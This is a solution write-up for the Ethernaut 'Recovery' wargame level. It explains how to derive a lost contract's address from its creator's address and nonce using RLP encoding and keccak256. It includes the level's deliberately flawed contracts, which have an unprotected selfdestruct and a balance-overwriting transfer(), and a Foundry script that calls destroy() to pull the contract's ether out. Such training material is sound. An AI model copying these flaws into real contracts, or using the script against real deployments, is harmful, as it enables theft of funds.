# Ethernaut Level 17 Recovery

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

In this level, we are given a `Recovery` instance, and our goal is to find out the `SimpleToken` instance (address lost) that has been deployed by the `Recovery` instance, and then recover all the money from the lost address. We can see that there's a `selfdestruct` inside the `SimpleToken` logic, so it would be easy to recover the fund if we can get the lost address.

So how can we get the lost `SimpleToken` instance address?

When a contract uses `new ContractName(...)` (i.e., this contract will deploy a new contract instance), under the hood the EVM uses the CREATE opcode. For contracts created by CREATE (i.e., not CREATE2), the address of the newly created contract is **deterministic** and depends merely on:

1. The **creator** address (either an EOA or another contract).
2. The **nonce** of that creator (for contracts, the number of contracts it has created).

Since we have all these two things, we can surely recover the lost address. In ETH Yellow Paper, the formula for new address `a` is:

`a = keccak256( RLP( [ sender_address, nonce ] ) )[12:]  // i.e. last 20 bytes`

We have to RLP encode the two elements (all in bytes), hash it with `keccak256`, and then take last 20 bytes to get the new address. RLP (Recursive Length Prefix encoding) has different rules of encoding when it comes to different items:

1. **Items**

   - An *item* is either a *string* (i.e., a byte array) or a *list* of items. 
   - Note: In Ethereum’s context, integers are encoded as big-endian byte arrays with **no leading zeroes**. 

   

2. **Single byte (0x00 to 0x7f)**

   - If the item is exactly one byte and its value is in the range 0x00 to 0x7f (0 to 127 decimal), then the item’s encoding is the byte itself (no prefix). 

   

3. **Short string (length 0 to 55 bytes, but not the special single-byte case above)**

   - If the string’s length is between 0 and 55 bytes (and is *not* the special one‐byte ≤ 0x7f case), then encoding =

     0x80 + length_of_string (one prefix byte) followed by the raw string bytes. 

   - The prefix byte range for this is 0x80 through 0xb7.

   

4. **Long string (length > 55 bytes)**

   - If the string’s length is more than 55 bytes, then encoding =

     0xb7 + length_of_length (prefix) + (length in big‐endian) + (string bytes) 

   - The prefix byte range for this is 0xb8 through 0xbf.

   

5. **Short list (total payload length of list ≤ 55 bytes)**

   - If you have a list of items (each item is itself RLP encoded) and the *sum of the lengths* of those encoded items (the “payload”) is ≤ 55 bytes, then encoding =

     0xc0 + payload_length (prefix) + (concatenation of items’ encodings) 

   - The prefix byte range for this is 0xc0 through 0xf7 (for payloads ≤ 55 bytes).

   

6. **Long list (payload length > 55 bytes)**

   - If the list’s total encoded payload is > 55 bytes, then encoding =

     0xf7 + length_of_length (prefix) + (length in big‐endian) + (concatenation of item encodings) 

   - The prefix byte range for this is 0xf8 through 0xff.

   

So, based on the rules, we have to first encode `sender_address` and `nonce` each, concat them as a list, and add a list prefix. For `sender_address`, since its length is of 20 bytes, it falls in **short string** category, we encode it with a `0x80 + 20 = 0x94` prefix. For nonce, it is a **single byte** `0x01`. These two concatted is a **short list** (only `20 + 1 + 1 = 22` bytes length), we encode it with a prefix `oxc0 + 22 = 0xd6`. So the final encoding should look like this: `abi.encodePacked(bytes1(0xd6), bytes1(0x94), RECOVERY_CONTRACT_ADDRESS, bytes1(0x01))`.

`Recovery.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract RecoveryScript is Script {
    address RECOVERY_CONTRACT_ADDRESS = 0x1292C9a4EA137dC6eeBD26a4169e618Fe71bAbAF;
    // new address: a = keccak256( RLP( [ sender_address, nonce ] ) )[12:]  // i.e. last 20 bytes
    address lostAddress = address(
        uint160(
            uint256(
                keccak256(
                    abi.encodePacked(
                        bytes1(0xd6),  // 0xc0 + 22 (length of the list)
                        bytes1(0x94),  // 0x80 + 20 (length of the address)
                        RECOVERY_CONTRACT_ADDRESS,
                        bytes1(0x01) // nonce = 1
                    )
                )
            )
        )
    );

    Recovery recovery = Recovery(RECOVERY_CONTRACT_ADDRESS);
    SimpleToken token = SimpleToken(payable(lostAddress));

    function run() external {
        vm.startBroadcast();
        token.destroy(payable(RECOVERY_CONTRACT_ADDRESS));
        vm.stopBroadcast();
        console.log("Recovery contract balance:", address(RECOVERY_CONTRACT_ADDRESS).balance);
    }
}
```

